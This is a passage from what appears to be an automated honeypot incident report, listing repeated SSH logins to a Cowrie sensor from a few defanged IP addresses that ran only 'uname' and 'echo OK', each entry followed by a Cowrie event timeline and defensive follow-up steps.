- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbe34e29bf4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:14 |
| **Last Seen** | 2026-06-25 18:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:14:49` | `cowrie.session.connect` |
| `2026-06-25 18:14:49` | `cowrie.client.version` |
| `2026-06-25 18:14:49` | `cowrie.client.kex` |
| `2026-06-25 18:14:49` | `cowrie.login.success` |
| `2026-06-25 18:14:50` | `cowrie.session.params` |
| `2026-06-25 18:14:50` | `cowrie.command.input` |
| `2026-06-25 18:14:50` | `cowrie.log.closed` |
| `2026-06-25 18:14:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-759ea7eddac7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:15 |
| **Last Seen** | 2026-06-25 18:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:15:34` | `cowrie.session.connect` |
| `2026-06-25 18:15:34` | `cowrie.client.version` |
| `2026-06-25 18:15:34` | `cowrie.client.kex` |
| `2026-06-25 18:15:35` | `cowrie.login.success` |
| `2026-06-25 18:15:36` | `cowrie.session.params` |
| `2026-06-25 18:15:36` | `cowrie.command.input` |
| `2026-06-25 18:15:36` | `cowrie.log.closed` |
| `2026-06-25 18:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19107b4b7232

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:16 |
| **Last Seen** | 2026-06-25 18:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:16:20` | `cowrie.session.connect` |
| `2026-06-25 18:16:20` | `cowrie.client.version` |
| `2026-06-25 18:16:21` | `cowrie.client.kex` |
| `2026-06-25 18:16:21` | `cowrie.login.success` |
| `2026-06-25 18:16:22` | `cowrie.session.params` |
| `2026-06-25 18:16:22` | `cowrie.command.input` |
| `2026-06-25 18:16:22` | `cowrie.log.closed` |
| `2026-06-25 18:16:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9588cddad59

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 18:17 |
| **Last Seen** | 2026-06-25 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:17:05` | `cowrie.session.connect` |
| `2026-06-25 18:17:05` | `cowrie.client.version` |
| `2026-06-25 18:17:05` | `cowrie.client.kex` |
| `2026-06-25 18:17:05` | `cowrie.login.success` |
| `2026-06-25 18:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdab55d47841

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 18:17 |
| **Last Seen** | 2026-06-25 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:17:05` | `cowrie.session.connect` |
| `2026-06-25 18:17:05` | `cowrie.client.version` |
| `2026-06-25 18:17:05` | `cowrie.client.kex` |
| `2026-06-25 18:17:05` | `cowrie.login.success` |
| `2026-06-25 18:17:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be1decf4f76d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:17 |
| **Last Seen** | 2026-06-25 18:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:17:06` | `cowrie.session.connect` |
| `2026-06-25 18:17:06` | `cowrie.client.version` |
| `2026-06-25 18:17:06` | `cowrie.client.kex` |
| `2026-06-25 18:17:06` | `cowrie.login.success` |
| `2026-06-25 18:17:07` | `cowrie.session.params` |
| `2026-06-25 18:17:07` | `cowrie.command.input` |
| `2026-06-25 18:17:07` | `cowrie.log.closed` |
| `2026-06-25 18:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bde302632d9a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 18:17 |
| **Last Seen** | 2026-06-25 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:17:08` | `cowrie.session.connect` |
| `2026-06-25 18:17:08` | `cowrie.client.version` |
| `2026-06-25 18:17:08` | `cowrie.client.kex` |
| `2026-06-25 18:17:08` | `cowrie.login.success` |
| `2026-06-25 18:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df5781fbfca0

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-25 18:17 |
| **Last Seen** | 2026-06-25 18:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:17:08` | `cowrie.session.connect` |
| `2026-06-25 18:17:08` | `cowrie.client.version` |
| `2026-06-25 18:17:08` | `cowrie.client.kex` |
| `2026-06-25 18:17:08` | `cowrie.login.success` |
| `2026-06-25 18:17:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92aa599862e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:17 |
| **Last Seen** | 2026-06-25 18:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:17:51` | `cowrie.session.connect` |
| `2026-06-25 18:17:51` | `cowrie.client.version` |
| `2026-06-25 18:17:51` | `cowrie.client.kex` |
| `2026-06-25 18:17:51` | `cowrie.login.success` |
| `2026-06-25 18:17:52` | `cowrie.session.params` |
| `2026-06-25 18:17:52` | `cowrie.command.input` |
| `2026-06-25 18:17:52` | `cowrie.log.closed` |
| `2026-06-25 18:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9b8d0b6c725

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:18 |
| **Last Seen** | 2026-06-25 18:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:18:35` | `cowrie.session.connect` |
| `2026-06-25 18:18:35` | `cowrie.client.version` |
| `2026-06-25 18:18:35` | `cowrie.client.kex` |
| `2026-06-25 18:18:35` | `cowrie.login.success` |
| `2026-06-25 18:18:36` | `cowrie.session.params` |
| `2026-06-25 18:18:36` | `cowrie.command.input` |
| `2026-06-25 18:18:36` | `cowrie.log.closed` |
| `2026-06-25 18:18:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c42ca70d9574

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:19 |
| **Last Seen** | 2026-06-25 18:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:19:19` | `cowrie.session.connect` |
| `2026-06-25 18:19:19` | `cowrie.client.version` |
| `2026-06-25 18:19:19` | `cowrie.client.kex` |
| `2026-06-25 18:19:19` | `cowrie.login.success` |
| `2026-06-25 18:19:20` | `cowrie.session.params` |
| `2026-06-25 18:19:20` | `cowrie.command.input` |
| `2026-06-25 18:19:20` | `cowrie.log.closed` |
| `2026-06-25 18:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d7e5e998902

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:20 |
| **Last Seen** | 2026-06-25 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:20:03` | `cowrie.session.connect` |
| `2026-06-25 18:20:03` | `cowrie.client.version` |
| `2026-06-25 18:20:03` | `cowrie.client.kex` |
| `2026-06-25 18:20:03` | `cowrie.login.success` |
| `2026-06-25 18:20:04` | `cowrie.session.params` |
| `2026-06-25 18:20:04` | `cowrie.command.input` |
| `2026-06-25 18:20:04` | `cowrie.log.closed` |
| `2026-06-25 18:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2df3cd7dfec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:20 |
| **Last Seen** | 2026-06-25 18:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:20:50` | `cowrie.session.connect` |
| `2026-06-25 18:20:50` | `cowrie.client.version` |
| `2026-06-25 18:20:50` | `cowrie.client.kex` |
| `2026-06-25 18:20:51` | `cowrie.login.success` |
| `2026-06-25 18:20:51` | `cowrie.session.params` |
| `2026-06-25 18:20:51` | `cowrie.command.input` |
| `2026-06-25 18:20:51` | `cowrie.log.closed` |
| `2026-06-25 18:20:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df147ffd2158

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 18:20 |
| **Last Seen** | 2026-06-25 18:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:20:51` | `cowrie.session.connect` |
| `2026-06-25 18:20:51` | `cowrie.client.version` |
| `2026-06-25 18:20:51` | `cowrie.client.kex` |
| `2026-06-25 18:20:53` | `cowrie.login.success` |
| `2026-06-25 18:20:54` | `cowrie.session.params` |
| `2026-06-25 18:20:54` | `cowrie.command.input` |
| `2026-06-25 18:20:55` | `cowrie.log.closed` |
| `2026-06-25 18:20:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53dbd3f79905

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 18:21 |
| **Last Seen** | 2026-06-25 18:21 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:21:15` | `cowrie.session.connect` |
| `2026-06-25 18:21:17` | `cowrie.client.version` |
| `2026-06-25 18:21:17` | `cowrie.client.kex` |
| `2026-06-25 18:21:23` | `cowrie.login.success` |
| `2026-06-25 18:21:26` | `cowrie.session.params` |
| `2026-06-25 18:21:26` | `cowrie.command.input` |
| `2026-06-25 18:21:28` | `cowrie.log.closed` |
| `2026-06-25 18:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51747f845215

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:21 |
| **Last Seen** | 2026-06-25 18:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:21:43` | `cowrie.session.connect` |
| `2026-06-25 18:21:43` | `cowrie.client.version` |
| `2026-06-25 18:21:43` | `cowrie.client.kex` |
| `2026-06-25 18:21:43` | `cowrie.login.success` |
| `2026-06-25 18:21:44` | `cowrie.session.params` |
| `2026-06-25 18:21:44` | `cowrie.command.input` |
| `2026-06-25 18:21:44` | `cowrie.log.closed` |
| `2026-06-25 18:21:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2174fc6fd8cb

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 18:22 |
| **Last Seen** | 2026-06-25 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:22:10` | `cowrie.session.connect` |
| `2026-06-25 18:22:10` | `cowrie.client.version` |
| `2026-06-25 18:22:10` | `cowrie.client.kex` |
| `2026-06-25 18:22:10` | `cowrie.login.success` |
| `2026-06-25 18:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a7bb05552b

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 18:22 |
| **Last Seen** | 2026-06-25 18:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:22:10` | `cowrie.session.connect` |
| `2026-06-25 18:22:10` | `cowrie.client.version` |
| `2026-06-25 18:22:10` | `cowrie.client.kex` |
| `2026-06-25 18:22:11` | `cowrie.login.success` |
| `2026-06-25 18:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0d5a9563e0a

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 18:22 |
| **Last Seen** | 2026-06-25 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:22:20` | `cowrie.session.connect` |
| `2026-06-25 18:22:20` | `cowrie.client.version` |
| `2026-06-25 18:22:20` | `cowrie.client.kex` |
| `2026-06-25 18:22:21` | `cowrie.login.success` |
| `2026-06-25 18:22:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00cd66d5edb2

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-06-25 18:22 |
| **Last Seen** | 2026-06-25 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:22:21` | `cowrie.session.connect` |
| `2026-06-25 18:22:21` | `cowrie.client.version` |
| `2026-06-25 18:22:21` | `cowrie.client.kex` |
| `2026-06-25 18:22:22` | `cowrie.login.success` |
| `2026-06-25 18:22:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a986d7883b00

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:22 |
| **Last Seen** | 2026-06-25 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:22:35` | `cowrie.session.connect` |
| `2026-06-25 18:22:35` | `cowrie.client.version` |
| `2026-06-25 18:22:35` | `cowrie.client.kex` |
| `2026-06-25 18:22:35` | `cowrie.login.success` |
| `2026-06-25 18:22:36` | `cowrie.session.params` |
| `2026-06-25 18:22:36` | `cowrie.command.input` |
| `2026-06-25 18:22:36` | `cowrie.log.closed` |
| `2026-06-25 18:22:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1490e9575b7

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:23 |
| **Last Seen** | 2026-06-25 18:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:23:22` | `cowrie.session.connect` |
| `2026-06-25 18:23:22` | `cowrie.client.version` |
| `2026-06-25 18:23:22` | `cowrie.client.kex` |
| `2026-06-25 18:23:23` | `cowrie.login.success` |
| `2026-06-25 18:23:24` | `cowrie.session.params` |
| `2026-06-25 18:23:24` | `cowrie.command.input` |
| `2026-06-25 18:23:25` | `cowrie.log.closed` |
| `2026-06-25 18:23:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f95ead01d1b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:24 |
| **Last Seen** | 2026-06-25 18:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:24:06` | `cowrie.session.connect` |
| `2026-06-25 18:24:06` | `cowrie.client.version` |
| `2026-06-25 18:24:06` | `cowrie.client.kex` |
| `2026-06-25 18:24:06` | `cowrie.login.success` |
| `2026-06-25 18:24:07` | `cowrie.session.params` |
| `2026-06-25 18:24:07` | `cowrie.command.input` |
| `2026-06-25 18:24:07` | `cowrie.log.closed` |
| `2026-06-25 18:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86677d4deb7d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:24 |
| **Last Seen** | 2026-06-25 18:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:24:50` | `cowrie.session.connect` |
| `2026-06-25 18:24:50` | `cowrie.client.version` |
| `2026-06-25 18:24:50` | `cowrie.client.kex` |
| `2026-06-25 18:24:50` | `cowrie.login.success` |
| `2026-06-25 18:24:51` | `cowrie.session.params` |
| `2026-06-25 18:24:51` | `cowrie.command.input` |
| `2026-06-25 18:24:51` | `cowrie.log.closed` |
| `2026-06-25 18:24:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0880a0d024a2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:25 |
| **Last Seen** | 2026-06-25 18:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:25:35` | `cowrie.session.connect` |
| `2026-06-25 18:25:35` | `cowrie.client.version` |
| `2026-06-25 18:25:35` | `cowrie.client.kex` |
| `2026-06-25 18:25:36` | `cowrie.login.success` |
| `2026-06-25 18:25:36` | `cowrie.session.params` |
| `2026-06-25 18:25:36` | `cowrie.command.input` |
| `2026-06-25 18:25:37` | `cowrie.log.closed` |
| `2026-06-25 18:25:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1368b1d92606

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:26 |
| **Last Seen** | 2026-06-25 18:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:26:23` | `cowrie.session.connect` |
| `2026-06-25 18:26:23` | `cowrie.client.version` |
| `2026-06-25 18:26:23` | `cowrie.client.kex` |
| `2026-06-25 18:26:24` | `cowrie.login.success` |
| `2026-06-25 18:26:25` | `cowrie.session.params` |
| `2026-06-25 18:26:25` | `cowrie.command.input` |
| `2026-06-25 18:26:25` | `cowrie.log.closed` |
| `2026-06-25 18:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-028f67bbaa08

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:27 |
| **Last Seen** | 2026-06-25 18:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:27:09` | `cowrie.session.connect` |
| `2026-06-25 18:27:09` | `cowrie.client.version` |
| `2026-06-25 18:27:09` | `cowrie.client.kex` |
| `2026-06-25 18:27:10` | `cowrie.login.success` |
| `2026-06-25 18:27:10` | `cowrie.session.params` |
| `2026-06-25 18:27:10` | `cowrie.command.input` |
| `2026-06-25 18:27:11` | `cowrie.log.closed` |
| `2026-06-25 18:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998c9523c142

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:27 |
| **Last Seen** | 2026-06-25 18:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
